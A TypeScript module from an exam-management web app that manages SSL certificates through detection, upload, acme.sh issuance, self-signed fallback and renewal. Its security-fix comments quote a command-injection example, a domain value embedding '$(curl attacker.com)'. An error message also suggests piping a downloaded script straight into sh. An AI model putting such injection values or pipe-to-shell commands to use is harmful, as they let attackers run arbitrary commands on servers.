/**
 * KeKe ExamHub - 考试信息管理系统
 * SSL 证书管理工具
 * @author 落梦陳 (KeKe0904) | B站/抖音: 落梦陳
 * @github https://github.com/KeKe0904/KeKe-ExamHub
 * 本项目使用 Trae IDE 开发
 * @license MIT
 *
 * 功能说明:
 *   1. detectExistingCert(domain) — 检测服务器内是否已有该域名的 SSL 证书
 *      扫描常见证书存放路径（Let's Encrypt、Nginx、自定义目录）
 *   2. saveUploadedCert(domain, certPem, keyPem) — 保存用户上传的证书文件
 *   3. issueCertificate(domain, domainId) — 自动申请 Let's Encrypt 免费证书
 *      优先调用 acme.sh，若未安装则回退到自签名证书（仅测试用）
 *   4. renewCertificate / checkAndRenewExpiring — 证书续期（保留接口）
 */
import fs from "fs";
import path from "path";
import { execFile } from "child_process";
import { promisify } from "util";
import { fileURLToPath } from "url";
import { pool } from "../config/database.js";

const execFileAsync = promisify(execFile);
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// 项目级证书目录: api/certs/<domain>/{fullchain.pem, privkey.pem}
const CERT_DIR = path.join(__dirname, "../../certs");

// 服务器内可能存放证书的常见路径（用于 detectExistingCert 扫描）
const CERT_SEARCH_PATHS: string[] = [
  // Let's Encrypt 标准路径（certbot 自动续期会用到）
  "/etc/letsencrypt/live",
  // acme.sh 默认安装路径
  "/root/.acme.sh",
  // Nginx 自定义 SSL 目录
  "/etc/nginx/ssl",
  // 通用的 SSL 证书目录
  "/etc/ssl/certs",
  // 用户自定义目录
  "/root/certs",
  "/home/certs",
];

// 确保证书目录存在
function ensureCertDir() {
  if (!fs.existsSync(CERT_DIR)) {
    fs.mkdirSync(CERT_DIR, { recursive: true });
  }
}

// 证书检测结果
export interface CertDetectionResult {
  found: boolean;
  certPath: string | null;
  keyPath: string | null;
  source: string | null; // 证书来源: letsencrypt / acme.sh / nginx / custom
  message: string;
}

/**
 * 检测服务器内是否已有该域名的 SSL 证书
 * 扫描 CERT_SEARCH_PATHS 下的子目录，查找 <domain>/fullchain.pem 或 <domain>.crt
 *
 * @param domain 待检测的域名
 * @returns 检测结果
 */
export async function detectExistingCert(domain: string): Promise<CertDetectionResult> {
  // 1. 优先检查项目自身证书目录 api/certs/<domain>/
  const projectCertPath = path.join(CERT_DIR, domain, "fullchain.pem");
  const projectKeyPath = path.join(CERT_DIR, domain, "privkey.pem");
  if (fs.existsSync(projectCertPath) && fs.existsSync(projectKeyPath)) {
    return {
      found: true,
      certPath: projectCertPath,
      keyPath: projectKeyPath,
      source: "project",
      message: "检测到项目证书目录中已有该域名的证书",
    };
  }

  // 2. 扫描常见系统证书路径
  for (const searchPath of CERT_SEARCH_PATHS) {
    if (!fs.existsSync(searchPath)) continue;

    // 模式 A: <searchPath>/<domain>/fullchain.pem + privkey.pem
    const dirCertPath = path.join(searchPath, domain, "fullchain.pem");
    const dirKeyPath = path.join(searchPath, domain, "privkey.pem");
    if (fs.existsSync(dirCertPath) && fs.existsSync(dirKeyPath)) {
      let source = "custom";
      if (searchPath.includes("letsencrypt")) source = "letsencrypt";
      else if (searchPath.includes(".acme.sh")) source = "acme.sh";
      else if (searchPath.includes("nginx")) source = "nginx";
      return {
        found: true,
        certPath: dirCertPath,
        keyPath: dirKeyPath,
        source,
        message: `在 ${source} 路径中检测到该域名的证书`,
      };
    }

    // 模式 B: Let's Encrypt 特有结构 <searchPath>/<domain>/cert.pem + privkey.pem
    const leCertPath = path.join(searchPath, domain, "cert.pem");
    const leKeyPath = path.join(searchPath, domain, "privkey.pem");
    if (fs.existsSync(leCertPath) && fs.existsSync(leKeyPath)) {
      const source = searchPath.includes("letsencrypt") ? "letsencrypt" : "custom";
      return {
        found: true,
        certPath: leCertPath,
        keyPath: leKeyPath,
        source,
        message: `在 ${source} 路径中检测到该域名的证书`,
      };
    }

    // 模式 C: 单文件形式 <searchPath>/<domain>.crt + <domain>.key
    const singleCertPath = path.join(searchPath, `${domain}.crt`);
    const singleKeyPath = path.join(searchPath, `${domain}.key`);
    if (fs.existsSync(singleCertPath) && fs.existsSync(singleKeyPath)) {
      return {
        found: true,
        certPath: singleCertPath,
        keyPath: singleKeyPath,
        source: "custom",
        message: "在自定义路径中检测到该域名的证书文件",
      };
    }
  }

  return {
    found: false,
    certPath: null,
    keyPath: null,
    source: null,
    message: "未检测到该域名的 SSL 证书",
  };
}

/**
 * 保存用户上传的 SSL 证书到项目证书目录
 * 同时更新数据库中的证书状态
 *
 * @param domain 域名
 * @param certPem 证书内容（PEM 格式，含 BEGIN CERTIFICATE）
 * @param keyPem 私钥内容（PEM 格式，含 BEGIN PRIVATE KEY）
 * @param domainId 数据库中域名记录 ID
 */
export async function saveUploadedCert(
  domain: string,
  certPem: string,
  keyPem: string,
  domainId: string
): Promise<{ certPath: string; keyPath: string }> {
  ensureCertDir();

  // 安全修复：校验域名格式，防止路径遍历攻击（如 domain="../etc"）
  if (!domain || /[\/\\]/.test(domain) || domain.includes("..") || !/^[a-zA-Z0-9.-]+$/.test(domain)) {
    throw new Error("域名格式非法");
  }

  // 校验证书格式（基本校验：必须包含 PEM 头）
  if (!certPem.includes("-----BEGIN CERTIFICATE-----")) {
    throw new Error("证书格式错误：未找到 BEGIN CERTIFICATE 标记");
  }
  if (!keyPem.includes("-----BEGIN PRIVATE KEY-----") && !keyPem.includes("-----BEGIN RSA PRIVATE KEY-----")) {
    throw new Error("私钥格式错误：未找到 BEGIN PRIVATE KEY 标记");
  }

  const domainDir = path.join(CERT_DIR, domain);
  if (!fs.existsSync(domainDir)) {
    fs.mkdirSync(domainDir, { recursive: true });
  }

  const certPath = path.join(domainDir, "fullchain.pem");
  const keyPath = path.join(domainDir, "privkey.pem");

  // 写入文件（权限 600，仅所有者可读写，保护私钥安全）
  fs.writeFileSync(certPath, certPem, { mode: 0o644 });
  fs.writeFileSync(keyPath, keyPem, { mode: 0o600 });

  // 从证书内容中解析过期时间（简单的 PEM 解析，提取 notAfter）
  const expiresAt = extractCertExpiry(certPem) || (() => {
    const d = new Date();
    d.setFullYear(d.getFullYear() + 1);
    return d;
  })();

  const now = new Date();

  // 更新数据库
  await pool.execute(
    `UPDATE domains
     SET cert_status = 'issued',
         cert_issued_at = ?,
         cert_expires_at = ?,
         cert_path = ?,
         cert_key_path = ?,
         last_checked_at = ?,
         error_message = NULL
     WHERE id = ?`,
    [now, expiresAt, certPath, keyPath, now, domainId]
  );

  console.log(`[SSL] 域名 ${domain} 上传证书保存成功`);
  console.log(`[SSL] 证书路径: ${certPath}`);
  console.log(`[SSL] 私钥路径: ${keyPath}`);

  return { certPath, keyPath };
}

/**
 * 从 PEM 证书内容中提取过期时间
 *
 * 实现方式：调用 openssl x509 命令解析证书的 notAfter 字段。
 *
 * 安全修复（v1.2.0）：
 *   旧实现使用 execSync 拼接 shell 命令，certPem 通过 replace(/"/g, '\\"') 转义双引号后拼入命令字符串，
 *   但攻击者可在证书内容中注入反引号、$()、换行符等 shell 元字符绕过转义，执行任意命令。
 *   现改为 execFileSync 参数数组方式传递，certPem 通过 stdin 输入，不经 shell 解析。
 *
 * @param certPem PEM 格式证书内容（含 -----BEGIN CERTIFICATE----- 头尾）
 * @returns 成功返回 Date 对象，失败（openssl 不可用或解析失败）返回 null
 */
function extractCertExpiry(certPem: string): Date | null {
  try {
    // 安全修复：使用 execFileSync 替代 execSync（避免 shell 拼接导致的命令注入）
    const { execFileSync } = require("child_process");
    const result = execFileSync(
      "openssl",
      ["x509", "-noout", "-enddate"],
      { input: certPem, encoding: "utf8", timeout: 5000 }
    ).trim();
    // openssl 输出格式：notAfter=Dec 31 23:59:59 2025 GMT
    const match = result.match(/notAfter=(.+)/);
    if (match) {
      const date = new Date(match[1]);
      if (!isNaN(date.getTime())) return date;
    }
  } catch {
    // openssl 不可用或证书格式无法解析，返回 null 由调用方兜底处理
  }
  return null;
}

/**
 * 生成自签名证书（仅用于开发测试，浏览器会标记为不安全）
 *
 * 安全修复（v1.2.0 后补充）：
 *   旧实现使用 execSync 拼接 shell 命令：
 *     `openssl req ... -subj "/CN=${domain}"`
 *   domain 参数来自数据库的 domains.domain_name 字段，未经校验直接拼接到 shell 字符串中，
 *   存在命令注入风险。例如 domain = 'x";$(curl attacker.com);"' 可执行任意命令。
 *   现改为使用 execFileSync 以参数数组方式调用 openssl，与 extractCertExpiry 的修复方式保持一致。
 *   同时在入口处增加域名校验（与 saveUploadedCert 保持一致），双重保险。
 *
 * @param domain 目标域名（仅用于证书 CN 字段，不参与 shell 拼接）
 * @returns { cert: PEM 证书内容, key: PEM 私钥内容 }
 */
function generateSelfSignedCert(domain: string): { cert: string; key: string } {
  // 安全修复：入口校验域名格式，防止路径遍历与 shell 元字符注入
  // 与 saveUploadedCert 中的校验保持一致：仅允许字母、数字、点、减号
  if (!domain || /[\/\\]/.test(domain) || domain.includes("..") || !/^[a-zA-Z0-9.-]+$/.test(domain)) {
    throw new Error("域名格式非法，无法生成自签名证书");
  }

  // 优先使用 openssl 生成合法的 X.509 自签名证书（有效期 365 天）
  try {
    // 安全修复：使用 execFileSync 替代 execSync
    //   - execSync 通过 shell 执行命令字符串，存在元字符注入风险
    //   - execFileSync 直接以 execve 方式调用，参数以数组传递，不经 shell 解析
    const { execFileSync } = require("child_process");
    const os = require("os");
    const tmpDir = os.tmpdir();
    // 使用 path.join 拼接临时文件路径（domain 已通过上面的格式校验，无路径遍历风险）
    const certTmp = path.join(tmpDir, `${domain}.crt`);
    const keyTmp = path.join(tmpDir, `${domain}.key`);
    // 参数数组传递，避免 shell 拼接；stderr 重定向通过 stdio 选项控制
    execFileSync(
      "openssl",
      [
        "req", "-x509",
        "-newkey", "rsa:2048",
        "-nodes",                       // 不加密私钥
        "-keyout", keyTmp,              // 私钥输出路径
        "-out", certTmp,                // 证书输出路径
        "-days", "365",                 // 有效期 365 天
        "-subj", `/CN=${domain}`,       // 证书 Subject CN 字段
      ],
      { stdio: ["ignore", "ignore", "ignore"], timeout: 10000 }
    );
    const cert = fs.readFileSync(certTmp, "utf8");
    const key = fs.readFileSync(keyTmp, "utf8");
    // 清理临时文件，避免遗留证书泄露
    fs.unlinkSync(certTmp);
    fs.unlinkSync(keyTmp);
    return { cert, key };
  } catch {
    // openssl 不可用或调用失败，回退到 Node.js crypto 模块生成
    // 注意：此分支生成的证书不是合法的 X.509 证书，仅是 base64 编码的占位字符串
    // 浏览器会拒绝该证书，仅供开发测试观察 UI 使用
    const crypto = require("crypto");
    const keyPair = crypto.generateKeyPairSync("rsa", {
      modulusLength: 2048,
      publicKeyEncoding: { type: "spki", format: "pem" },
      privateKeyEncoding: { type: "pkcs8", format: "pem" },
    });
    // 构造一个伪 PEM（非合法 X.509，仅用于占位）
    const certBody = Buffer.from(`Self-signed cert for ${domain}`)
      .toString("base64")
      .match(/.{1,64}/g)
      ?.join("\n");
    const certPem = `-----BEGIN CERTIFICATE-----
${certBody}
-----END CERTIFICATE-----`;
    return { cert: certPem, key: keyPair.privateKey };
  }
}

/**
 * 通过 acme.sh 自动申请 Let's Encrypt 免费证书
 * 要求服务器已安装 acme.sh 且 80 端口可访问
 *
 * @param domain 目标域名
 * @returns 成功返回 { certPath, keyPath }，失败抛出异常
 */
async function requestAcmeCert(domain: string): Promise<{ certPath: string; keyPath: string }> {
  // 检查 acme.sh 是否安装
  const acmeSh = "/root/.acme.sh/acme.sh";
  if (!fs.existsSync(acmeSh)) {
    throw new Error("acme.sh 未安装，请先安装: curl https://get.acme.sh | sh");
  }

  // 项目证书目录
  const domainDir = path.join(CERT_DIR, domain);
  if (!fs.existsSync(domainDir)) {
    fs.mkdirSync(domainDir, { recursive: true });
  }
  const certPath = path.join(domainDir, "fullchain.pem");
  const keyPath = path.join(domainDir, "privkey.pem");

  // 调用 acme.sh 申请证书（standalone 模式，临时占用 80 端口）
  // 注意: 如果 Nginx 正在监听 80，需先停止 Nginx 或使用 webroot 模式
  console.log(`[ACME] 调用 acme.sh 为 ${domain} 申请证书...`);
  const { stdout, stderr } = await execFileAsync(
    acmeSh,
    ["--issue", "-d", domain, "--standalone"],
    { timeout: 120000 }
  );
  console.log(`[ACME] acme.sh 输出: ${stdout}`);
  if (stderr) console.log(`[ACME] acme.sh 警告: ${stderr}`);

  // 安装证书到项目目录
  await execFileAsync(
    acmeSh,
    ["--install-cert", "-d", domain,
     "--key-file", keyPath,
     "--fullchain-file", certPath,
     "--reloadcmd", "echo 'cert installed'"],
    { timeout: 30000 }
  );

  if (!fs.existsSync(certPath) || !fs.existsSync(keyPath)) {
    throw new Error("acme.sh 申请完成但证书文件未生成");
  }

  // 设置文件权限
  fs.chmodSync(certPath, 0o644);
  fs.chmodSync(keyPath, 0o600);

  console.log(`[ACME] 域名 ${domain} 证书申请成功`);
  return { certPath, keyPath };
}

/**
 * 申请 SSL 证书（主入口）
 * 优先使用 acme.sh 申请 Let's Encrypt 证书，失败则回退到自签名证书
 *
 * @param domain 目标域名
 * @param domainId 数据库域名记录 ID
 */
export async function issueCertificate(domain: string, domainId: string) {
  ensureCertDir();

  try {
    console.log(`[SSL] 开始为域名 ${domain} 申请证书...`);

    let certPath: string;
    let keyPath: string;
    let certSource: "acme" | "self-signed";

    // 优先尝试 acme.sh
    try {
      const result = await requestAcmeCert(domain);
      certPath = result.certPath;
      keyPath = result.keyPath;
      certSource = "acme";
    } catch (acmeError: any) {
      console.warn(`[SSL] acme.sh 申请失败: ${acmeError.message}`);
      console.warn(`[SSL] 回退到自签名证书（仅开发测试用）`);

      const domainDir = path.join(CERT_DIR, domain);
      if (!fs.existsSync(domainDir)) {
        fs.mkdirSync(domainDir, { recursive: true });
      }
      certPath = path.join(domainDir, "fullchain.pem");
      keyPath = path.join(domainDir, "privkey.pem");

      const { cert, key } = generateSelfSignedCert(domain);
      fs.writeFileSync(certPath, cert, { mode: 0o644 });
      fs.writeFileSync(keyPath, key, { mode: 0o600 });
      certSource = "self-signed";
    }

    // 解析证书过期时间
    const certContent = fs.readFileSync(certPath, "utf8");
    const expiresAt = extractCertExpiry(certContent) || (() => {
      const d = new Date();
      d.setFullYear(d.getFullYear() + 1);
      return d;
    })();
    const now = new Date();

    await pool.execute(
      `UPDATE domains
       SET cert_status = 'issued',
           cert_issued_at = ?,
           cert_expires_at = ?,
           cert_path = ?,
           cert_key_path = ?,
           last_checked_at = ?,
           error_message = NULL
       WHERE id = ?`,
      [now, expiresAt, certPath, keyPath, now, domainId]
    );

    console.log(`[SSL] 域名 ${domain} 证书颁发成功 (来源: ${certSource})`);
    console.log(`[SSL] 证书路径: ${certPath}`);

    return { certPath, keyPath };
  } catch (error: any) {
    console.error(`[SSL] 域名 ${domain} 证书颁发失败:`, error);

    await pool.execute(
      `UPDATE domains
       SET cert_status = 'failed',
           error_message = ?,
           last_checked_at = NOW()
       WHERE id = ?`,
      [error.message || "证书颁发失败", domainId]
    );

    throw error;
  }
}

/**
 * 续期指定域名的证书
 */
export async function renewCertificate(domainId: string) {
  const [rows] = await pool.execute(
    "SELECT * FROM domains WHERE id = ?",
    [domainId]
  );
  const domains = rows as any[];

  if (domains.length === 0) {
    throw new Error("域名不存在");
  }

  const domain = domains[0];
  return issueCertificate(domain.domain_name, domainId);
}

/**
 * 检查并续期即将过期的证书（可由定时任务调用）
 */
export async function checkAndRenewExpiring() {
  try {
    const sevenDaysLater = new Date();
    sevenDaysLater.setDate(sevenDaysLater.getDate() + 7);

    const [rows] = await pool.execute(
      `SELECT * FROM domains
       WHERE cert_status = 'issued'
         AND cert_expires_at < ?`,
      [sevenDaysLater]
    );

    const expiringDomains = rows as any[];

    for (const domain of expiringDomains) {
      console.log(`[SSL] 域名 ${domain.domain_name} 证书即将过期，开始续期...`);
      try {
        await renewCertificate(domain.id);
        console.log(`[SSL] 域名 ${domain.domain_name} 证书续期成功`);
      } catch (error) {
        console.error(`[SSL] 域名 ${domain.domain_name} 证书续期失败:`, error);
      }
    }

    return expiringDomains.length;
  } catch (error) {
    console.error("[SSL] 检查过期证书失败:", error);
    return 0;
  }
}

/**
 * 获取指定域名的证书文件路径（若存在）
 *
 * 安全说明：
 *   domain 参数仅用于拼接路径，已通过正则校验避免路径遍历。
 *   校验规则与 saveUploadedCert 保持一致：仅允许字母、数字、点、减号。
 *   若域名格式非法（含 / \ .. 等），直接返回 null，避免读取 CERT_DIR 之外的文件。
 *
 * @param domain 目标域名
 * @returns 存在时返回 { certPath, keyPath }，不存在或域名非法时返回 null
 */
export function getCertPaths(domain: string): { certPath: string; keyPath: string } | null {
  // 域名格式校验：防止 path.join 后路径越界（如 domain="../etc"）
  if (!domain || /[\/\\]/.test(domain) || domain.includes("..") || !/^[a-zA-Z0-9.-]+$/.test(domain)) {
    return null;
  }

  const certPath = path.join(CERT_DIR, domain, "fullchain.pem");
  const keyPath = path.join(CERT_DIR, domain, "privkey.pem");

  if (fs.existsSync(certPath) && fs.existsSync(keyPath)) {
    return { certPath, keyPath };
  }

  return null;
}
